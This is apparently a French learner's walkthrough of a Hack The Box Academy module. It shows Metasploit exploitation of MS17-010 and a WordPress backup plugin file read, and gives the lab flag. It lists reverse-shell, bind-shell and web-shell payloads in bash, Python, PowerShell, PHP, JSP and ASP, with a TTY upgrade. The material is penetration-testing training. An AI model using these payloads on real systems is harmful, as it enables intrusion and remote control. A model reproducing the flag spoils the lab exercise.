Nous pouvons également utiliser des bases de données d'exploits en ligne pour rechercher des vulnérabilités, telles que [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/) ou [Vulnerability Lab](https://www.vulnerability-lab.com/). Le module « [Introduction aux applications web](https://academy.hackthebox.com/module/details/75) » aborde les vulnérabilités publiques des applications web.

### Metasploit Primer

`Metasploit Framework` (MSF) est un excellent outil pour les testeurs d'intrusion. Il intègre de nombreux exploits pour **diverses vulnérabilités** publiques et permet de les exploiter facilement contre des cibles vulnérables. MSF offre également de nombreuses autres fonctionnalités, telles que :

- Exécution de scripts de reconnaissance pour recenser les hôtes distants et les cibles compromises

- Scripts de vérification pour tester l'existence d'une vulnérabilité sans compromettre la cible

- Meterpreter, un outil performant pour se connecter à des shells et exécuter des commandes sur les cibles compromises

- Nombreux outils de post-exploitation et de pivotement

Prenons l'exemple de la recherche d'un exploit pour une application que nous attaquons et de son exploitation. Pour lancer Metasploit, nous pouvons utiliser la commande `msfconsole`.

```bash
Arcony@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

Une fois `Metasploit` lancé, nous pouvons rechercher notre application cible à l'aide de la commande `search exploit`. Par exemple, nous pouvons rechercher la vulnérabilité SMB que nous avons identifiée précédemment :

```bash
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
```

> La recherche peut appliquer des filtres complexes, tels que « cve:2009 type:exploit ». Consultez la liste complète des filtres avec l'aide de la recherche.
{: .prompt-tip}

Nous avons découvert une faille de sécurité dans ce service. On peut l'exploiter en copiant son nom complet et en utilisant la commande `USE` :

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Avant de pouvoir exécuter l'exploit, nous devons **configurer ses options**. Pour afficher les options configurables, nous pouvons utiliser la commande « `show options` » :

```bash
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

Toute option dont le paramètre `Required` est défini sur `YES` doit être configurée pour que l'exploit fonctionne. Dans ce cas précis, seules deux options sont à configurer : `RHOSTS` (Remote Hosts), qui correspond à l'adresse IP de notre cible (il peut s'agir d'une seule adresse IP, de plusieurs adresses IP ou d'un fichier contenant une liste d'adresses IP). La seconde option, `LHOST` (Local Host), représente l'adresse IP de notre hôte d'attaque (il peut s'agir d'une adresse IP unique ou du nom d'une interface réseau. Dans l'exemple ci-dessous, `LHOST` est configuré avec l'adresse IP associée à notre interface `tun0`). Ces options peuvent être configurées à l'aide de la commande `set`.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Une fois les deux options configurées, nous pouvons lancer l'exploitation. Toutefois, avant d'exécuter le script, nous pouvons `effectuer une vérification` pour nous assurer que le serveur est vulnérable :

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

Comme on peut le constater, le serveur est effectivement **vulnérable**. Notez que toutes les failles de sécurité du **framework Metasploit** ne prennent pas en charge la fonction de vérification. Enfin, nous pouvons utiliser la commande `run` ou `exploit` pour exécuter l'exploit.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

Comme vous pouvez le constater, nous avons obtenu les **droits d'administrateur** sur la machine et utilisé la commande `shell` pour accéder à un `shell interactif`. Ce sont des exemples basiques d'utilisation de Metasploit pour exploiter une vulnérabilité sur un serveur distant. La plateforme Hack The Box propose de nombreuses machines obsolètes idéales pour s'entraîner à Metasploit. En voici quelques exemples :

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

Plus loin dans ce module, nous explorerons la machine `Nibbles` étape par étape, puis nous montrerons comment l'exploiter avec Metasploit. Metasploit est un **outil essentiel** à ajouter à notre panoplie, mais il est crucial de ne pas s'y fier exclusivement. Pour être des testeurs complets, nous devons savoir tirer le meilleur parti de tous les outils à notre disposition, comprendre leurs limites et savoir quand recourir à des techniques manuelles ou à d'autres outils.

---

**Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)**

Ok maintenant nous allons devoir exploiter la faille qui se trouve sur le système cible avec Metasploit j'imagine mais d'abors nous devons trouver de quelle faille il s'agit.

Pour le savoir nous allons faire de l'énumération web comme nous avons appris dans le cours précédent, mais il y avait une commande particulière qui énumérait les différentes technos qu'il y a sur la cible et cette commande c'est bien `whatweb`

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-c1r7knwlcp]─[~]
└──╼ [★]$ whatweb 83.136.254.84:40800
http://83.136.254.84:40800 [200 OK] Apache[2.4.41], Country[FINLAND][FI], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[83.136.254.84], MetaGenerator[WordPress 5.6.1], PoweredBy[--], Script, Title[Getting Started &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.6.1]
```

Et tout compte fait rien n'est intéressant ici mise a part le fait que nous savons que c'est une site wordpress encore donc en le consultant j'ai pu lire que ça parlait beaucoup d'un **plugin wordpress** nommé : `Simple Backup Plugin 2.7.10` donc en lançant **metasploit** j'ai fait la commande `search Simple Backup Plugin 2.7.10` et voici ce que j'ai trouvé:

```bash
[msf](Jobs:0 Agents:0) >> search Simple Backup Plugin 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read  .                normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
```

Parfait nous avons maintenant notre point d'entrée nous allons l'utiliser avec la commande `use` suivi du nom de l'**auxiliaire** ou simplement son chiffre qui est le `0` ici.

```bash
use 0
```

Maintenant nous avons besoin de **configurer** notre exploit pour qu'il fonctionne bien et nous pouvons voir ce que nous avons besoin de configurer avec la commande `show options` qui nous montre ceci:

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root fo
                                         lder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]. Supported pr
                                         oxies: socks4, socks5, sapni, socks5h
                                         , http
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   TARGETURI  /                yes       The base path to the wordpress applic
                                         ation
   THREADS    1                yes       The number of concurrent threads (max
                                          one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```

Nous voyons clairement maintenant tout ce qui est **Required** (nécéssaire) au bon fonctionnement de l'exploit avec le mot `yes` ou `no` et si la valeur n'est pas remplie, c'est que c'est a nous de la remplir comme le `RHOSTS` que nous allons mettre de ce pas a notre IP cible comme ceci : `set rhosts http://83.136.254.84:40800`

Ensuite il nous manque plus qu'a `run` l'exploit avec la commande `run` ou `exploit`, j'ai essayé de faire la commande `check` pour être bien sûr si notre cible était bien vulnérable mais la commande `check` n'était pas disponible pour cet exploit

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> run
[+] File saved in: /home/htb-ac-1999270/.msf4/loot/20251108185931_default_83.136.254.84_simplebackup.tra_219577.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Nous avons réussi ! L'exploit a bien fonctionné comme prévu et a sauvegardé un fichier sur notre machine a cet emplacement : `/home/htb-ac-1999270/.msf4/loot/20251108185931_default_83.136.254.84_simplebackup.tra_219577.txt`

En voici le contenu:

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-c1r7knwlcp]─[~/.msf4/loot]
└──╼ [★]$ cat 20251108185931_default_83.136.254.84_simplebackup.tra_219577.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:105:107::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
```

Nous avons sous nos yeux les différents utilisateurs mais HTB nous demande pas ça, ils nous demandent de `comprendre mieux` c'est a dire de regarder un peu mieux les paramètres et comment marche cet exploit, en effet celui ci récupère le contenu d'un fichier à l'emplacement de `FILEPATH` dans les options de l'exploit qui était par défaut a `/etc/passwd` ce qui est une information très précieuse en temps normal mais là nous avons simplement besoin de récupérer le contenu du fichier nommé `flag.txt` et à l'emplacement `/` car ils n'ont pas mis le nom du fichier avec un `/` devant pour rien...

Donc nous avons juste besoin de changer cette option avec `set FILEPATH /flag.txt` et en voici le résultat final:

**Réponse :** `HTB{my_f1r57_h4ck}`

## Types of Shells

Une fois un système compromis et une vulnérabilité exploitée pour exécuter des commandes à distance sur les hôtes compromis, il est généralement nécessaire de disposer d'une `méthode de communication` avec le système afin d'éviter de devoir exploiter la même vulnérabilité à chaque exécution de commande. Pour explorer le système ou en prendre le contrôle, notamment au sein de son réseau, une connexion fiable offrant un accès direct à son shell (`Bash ou PowerShell`) est indispensable pour analyser en profondeur le système distant et préparer la suite des opérations.

L'une des méthodes de connexion à un système compromis consiste à utiliser des protocoles réseau tels que `SSH` sous Linux ou `WinRM` sous Windows, permettant une connexion à distance. Cependant, sans identifiants de connexion valides, il est impossible d'utiliser ces méthodes sans avoir préalablement exécuté des commandes sur le système distant pour accéder à ces services.

L'autre méthode d'accès à un hôte compromis pour le contrôle et l'exécution de code à distance repose sur **l'utilisation de shells**.

Comme mentionné précédemment, il existe trois principaux types de shells : le shell inversé (`reverse shell`), le shell de liaison (`bind shell`) et le `shell web`. Chacun de ces interpréteurs de commandes possède une **méthode de communication différente** pour accepter et exécuter nos commandes.

- `Reverse Shell` -> Il se reconnecte à notre système et nous donne le contrôle via une connexion inverse.

- `Bind Shell` -> Il attend que nous nous y connections et nous en donne le contrôle une fois la connexion établie.

- `Web Shell` -> Il communique via un serveur web, accepte nos commandes via des paramètres HTTP, les exécute et affiche le résultat.

Examinons plus en détail chacuns des shells mentionnées ci-dessus et passons en revu des exemples pour chacun d'eux.

### Reverse Shell

Un `reverse shell` est le type de shell le plus courant, car `c'est la méthode la plus rapide et la plus simple` pour prendre le contrôle d'un hôte compromis. Une fois une vulnérabilité identifiée sur l'hôte distant permettant l'exécution de code à distance, nous pouvons démarrer un **écouteur netcat sur notre machine**, configuré pour écouter sur un port spécifique, par exemple le **port 1234**. Grâce à cet écouteur, nous pouvons exécuter une commande de shell inversé qui connecte l'interpréteur de commandes du système distant (Bash ou PowerShell) à notre écouteur netcat, établissant ainsi une connexion inversée avec le système distant.

#### Netcat Listener

La première étape consiste à démarrer un écouteur `netcat` sur un port de notre choix :

```bash
Arcony@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Les flags que nous utilisons sont les suivants :

- `-l` -> Mode écoute, en attendant qu'une connexion se établisse avec nous.

- `-v` -> Mode verbeux, pour savoir quand une connexion est établie.

- `-n` -> Désactivez la résolution DNS et connectez-vous uniquement depuis/vers des adresses IP afin d'accélérer la connexion.

- `-p 1234` -> Le numéro de port sur lequel netcat écoute, et la connexion inverse doit être envoyée à ce port.

Maintenant que nous avons un écouteur netcat en attente d'une connexion, nous pouvons exécuter la commande shell inversée qui se connecte à nous.

#### Connect Back IP

Cependant, nous devons d'abord trouver l'adresse IP de notre système pour qu'il puisse nous renvoyer une connexion. Nous pouvons trouver notre adresse IP avec la commande suivante :

```bash
Arcony@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

Dans notre exemple, l'adresse IP qui nous intéresse se trouve sous **tun0**, qui est le même réseau HTB auquel nous nous sommes connectés via notre VPN.

> Nous nous connectons à l'adresse IP de l'interface `tun0` car nous ne pouvons accéder aux serveurs HackTheBox que par le biais d'une connexion VPN. Ces serveurs n'ayant pas d'accès Internet, ils ne peuvent pas se connecter à nous via Internet en utilisant l'interface `eth0`. Lors d'un test d'intrusion réel, vous pourriez être connecté directement au même réseau ou effectuer un test d'intrusion externe; dans ce cas, la connexion pourrait se faire via l'interface `eth0` ou une interface similaire.
{: .prompt-info}

#### Reverse Shell Command

La commande exécutée **dépend du système d'exploitation** de la machine compromise (Linux ou Windows) et des applications et commandes accessibles. La page [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) propose une liste exhaustive de commandes de shell inversé utilisables, couvrant un large éventail d'options selon la machine compromise.

Certaines commandes de shell inversé sont plus fiables que d'autres et permettent généralement d'établir une connexion. Voici des commandes fiables pour établir une connexion inversée : `bash` sur les machines Linux compromises et `PowerShell` sur les machines Windows compromises.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Nous pouvons exploiter la vulnérabilité dont nous disposons sur l'hôte distant pour exécuter l'une des commandes ci-dessus, c'est-à-dire via une faille Python ou un module Metasploit, afin d'établir une connexion inverse. Une fois cela fait, nous devrions recevoir une connexion dans notre **écouteur netcat**.

```bash
Arcony@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Comme on peut le constater, après avoir établi une connexion sur notre écouteur netcat, nous avons pu saisir notre commande et en recevoir directement le résultat sur notre machine.

Un reverse shell est pratique pour établir une connexion rapide et fiable avec notre hôte compromis. Cependant, `un reverse shell est très fragile`. Si la commande du reverse shell est interrompue ou si nous perdons la connexion pour une raison quelconque, nous devrons `réutiliser l'exploit initial` pour exécuter à nouveau la commande du reverse shell et rétablir notre accès.

### Bind Shell

Un autre type de shell est le `Bind Shell`. Contrairement à un Reverse Shell qui se connecte à nous, **il faut s'y connecter via le port d'écoute de la cible**.

Une fois la commande Bind Shell exécutée, le système se met à écouter sur un port de l'hôte distant et y associe son shell (**Bash ou PowerShell**). Il faut ensuite se connecter à ce port avec netcat pour obtenir le contrôle du système via un shell.

#### Bind Shell Command

Une fois de plus, nous pouvons utiliser [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) pour trouver la commande appropriée permettant de démarrer notre bind shell.

> Nous allons établir une connexion d'écoute sur le port '1234' de l'hôte distant, avec l'adresse IP '0.0.0.0', afin de pouvoir nous y connecter depuis n'importe où.
{: .prompt-info}

Voici des commandes fiables que nous pouvons utiliser pour démarrer un shell bind :

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Netcat Connection

Une fois la commande `bind shell` exécutée, un shell devrait être disponible sur le port spécifié. Nous pouvons alors nous y connecter.

Pour ce faire, nous pouvons utiliser `netcat` afin d'accéder à ce port et d'obtenir une connexion au shell.

```bash
Arcony@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Comme on peut le constater, nous sommes directement connectés à une `session Bash` et pouvons interagir directement avec le système cible. Contrairement à un reverse shell, si nous interrompons notre connexion à un shell Bind pour quelque raison que ce soit, **nous pouvons nous y reconnecter immédiatement**. Cependant, si la commande du shell Bind est arrêtée ou si l'hôte distant redémarre, nous perdons l'accès à cet hôte et devons exploiter à nouveau la faille pour y accéder.

#### Upgrading TTY

Une fois connecté à un shell via Netcat, nous constaterons que nous pouvons uniquement saisir des commandes ou utiliser la touche Retour arrière. Il nous est **impossible de déplacer le curseur de texte** horizontalement pour modifier nos commandes, **ni de parcourir l'historique des commandes**. Pour ce faire, nous devons mettre à niveau notre terminal. Cela s'effectue en **mappant le terminal** de notre terminal avec le terminal distant.

Plusieurs méthodes permettent d'y parvenir. Nous utiliserons ici la méthode `python/stty`. Dans notre shell Netcat, nous utiliserons la commande suivante pour convertir notre shell en un terminal complet :

```bash
Arcony@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Après avoir exécuté cette commande, nous appuierons sur `Ctrl+Z` pour mettre notre shell en **arrière-plan** et revenir à notre terminal local, puis nous saisirons la commande `stty` suivante :

```bash
www-data@remotehost$ ^Z

[1] Stopped                 nc -lvnp 1234
Arcony@htb[/htb]$ stty raw -echo
Arcony@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Une fois la commande `fg` faite, l'interpréteur de commandes `netcat` revient au **premier plan**. Le terminal affiche alors une ligne vide. Appuyez de nouveau sur **Entrée** pour revenir à votre interpréteur, ou saisissez `reset` et appuyez sur **Entrée** pour le faire disparaître. Vous disposez alors d'un interpréteur de commandes `TTY` **pleinement fonctionnel**, avec l'historique des commandes et toutes les autres fonctionnalités.

Il se peut que votre interpréteur ne couvre pas tout le terminal. Pour résoudre ce problème, il faut déterminer quelques variables. Ouvrez une autre fenêtre de terminal sur votre système, maximisez-la ou choisissez la taille souhaitée, puis saisissez les commandes suivantes pour obtenir nos variables :

```bash
Arcony@htb[/htb]$ echo $TERM

xterm-256color
```

```bash
Arcony@htb[/htb]$ stty size

67 318
```

La première commande nous a affiché la variable `TERM`, et la seconde, les valeurs des lignes et des colonnes. Maintenant que nous avons nos variables, nous pouvons retourner dans notre **shell netcat** et utiliser la commande suivante pour les corriger :

```bash
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Une fois cela fait, nous devrions avoir un `shell netcat` qui utilise toutes les fonctionnalités du terminal, tout comme une connexion SSH.

### Web Shell

Le dernier type de shell que nous avons est le `Web Shell`. Un Web Shell est généralement `un script web`, par exemple en `PHP` ou `ASPX`, qui accepte notre commande via des **paramètres de requête HTTP** tels que les paramètres `GET` ou `POST`, exécute notre commande et affiche son résultat sur la page web.

#### Writing a Web Shell

Tout d'abord, nous devons écrire notre shell web qui recevra notre commande via une requête `GET`, l'exécutera et affichera son résultat. Un script de **shell web** est généralement une **commande courte**, facile à mémoriser, qui tient sur une seule ligne. Voici quelques exemples de scripts de shell web courts pour les langages web courants :

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

#### Uploading a Web Shell

Une fois notre shell web obtenu, il faut placer son script dans le répertoire racine (**webroot**) de l'hôte distant pour l'exécuter via un navigateur web. Ceci peut se faire en **exploitant une vulnérabilité** dans une `fonction d'envoi de fichiers`. On peut alors écrire notre shell dans un fichier, par exemple `shell.php`, l'envoyer, puis accéder à ce fichier pour exécuter des commandes.

Cependant, si l'exécution de commandes à distance n'est possible que par le biais d'un exploit, on peut écrire notre shell directement dans le répertoire racine (webroot) pour y accéder via le web. La première étape consiste donc à `identifier l'emplacement du répertoire racine` (webroot). Voici les répertoires racines par défaut des serveurs web courants :

| Web Server | Default Webroot |
|------------|-----------------|
| `Apache` | `/var/www/html/` |
| `Nginx` | `/usr/local/nginx/html/` |
| `IIS` | `c:\inetpub\wwwroot\` |
| `XAMPP` | `C:\xampp\htdocs\` |

Nous pouvons vérifier ces répertoires pour voir quel répertoire racine web est utilisé, puis utiliser la commande `echo` pour écrire notre shell web. Par exemple, si nous attaquons un hôte Linux exécutant Apache, nous pouvons écrire un **shell PHP** avec la commande suivante :

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Accessing Web Shell

Une fois notre shell web créé, nous pouvons y accéder `via un navigateur ou en utilisant cURL`. Nous pouvons ensuite `visiter la page shell.php` sur le site web compromis et utiliser `?cmd=id` pour exécuter la commande `id`.

![id](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_shell_exec_1.png)

Une autre option consiste à utiliser `cURL` :

```bash
Arcony@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Comme on peut le constater, il est possible de `modifier la commande à volonté` pour obtenir son résultat. Un avantage majeur d'un shell web est qu'il `contourne les restrictions de pare-feu`, car il n'ouvre pas de nouvelle connexion sur un port externe mais **s'exécute sur le port web** (80, 443 ou tout autre port utilisé par l'application web). Autre avantage non négligeable : **si la machine compromise est redémarrée, le shell web reste accessible** et permet d'exécuter des commandes sans avoir à exploiter à nouveau la machine distante.

En revanche, un shell web est **moins interactif** que les shells inversés et les shells de liaison, car il faut interroger une URL différente à chaque exécution de commande. Toutefois, dans des cas extrêmes, il est possible de développer un `script Python pour automatiser ce processus et obtenir un shell web semi-interactif directement dans le terminal`.

## Privilege Escalation

Notre premier accès à un serveur distant s'effectue généralement avec des **privilèges limités**, ce qui ne nous confère pas un accès complet au système. Pour obtenir cet accès, nous devons trouver **une vulnérabilité interne/locale** permettant `d'élever nos privilèges` à ceux de l'**utilisateur root** sous Linux ou de l'**administrateur/utilisateur** système sous Windows. Examinons quelques méthodes courantes d'élévation de privilèges.

### PrivEsc Checklists

Une fois l'accès initial à une machine obtenu, il est essentiel de l'explorer minutieusement afin d'identifier toute vulnérabilité potentielle exploitable pour obtenir des **privilèges plus élevés**. De nombreuses listes de vérification et aide-mémoires sont disponibles en ligne, répertoriant les tests à effectuer et les commandes correspondantes. [HackTricks](https://book.hacktricks.wiki/en/index.html) est une excellente ressource, proposant une **liste de vérification** très complète pour l'élévation de privilèges locale sous [Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) et [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html). [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) est un autre excellent dépôt, offrant également des **listes de vérification** pour [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) et [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). Il est crucial de commencer à expérimenter différentes commandes et techniques et de se familiariser avec elles afin d'identifier les multiples failles permettant d'élever ses privilèges.

### Enumeration Scripts

